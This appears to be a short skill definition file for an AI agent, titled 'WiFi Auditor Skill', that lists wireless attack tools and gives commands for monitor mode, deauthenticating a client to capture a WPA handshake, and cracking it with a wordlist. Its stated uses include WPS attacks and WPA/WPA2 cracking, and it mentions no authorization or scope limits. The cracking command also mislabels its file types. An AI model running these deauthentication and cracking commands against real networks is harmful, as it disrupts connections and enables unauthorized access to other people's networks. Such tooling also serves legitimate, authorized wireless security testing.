# WiFi Auditor Skill

## Purpose
Wireless network security assessment and auditing.

## Tools
- aircrack-ng - WiFi security auditing
- reaver - WPS brute force
- bully - WPS attacker
- wifite - Automated wireless auditor
- mdk4 - WiFi fuzzing

## Commands

### Monitor Mode
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
```

### Capture Handshake
```bash
airodump-ng -c channel --bssid MAC wlan0mon
aireplay-ng -0 1 -a MAC -c STATION wlan0mon
```

### Crack WPA
```bash
aircrack-ng -w wordlist.cap capture.hccapx
```

## Usage
Use this skill for:
- Discovering wireless networks
- Capturing handshakes
- WPS attacks
- WPA/WPA2 cracking

## Requirements
- TP-Link adapter (Atheros AR9271) supported
- Monitor mode capable
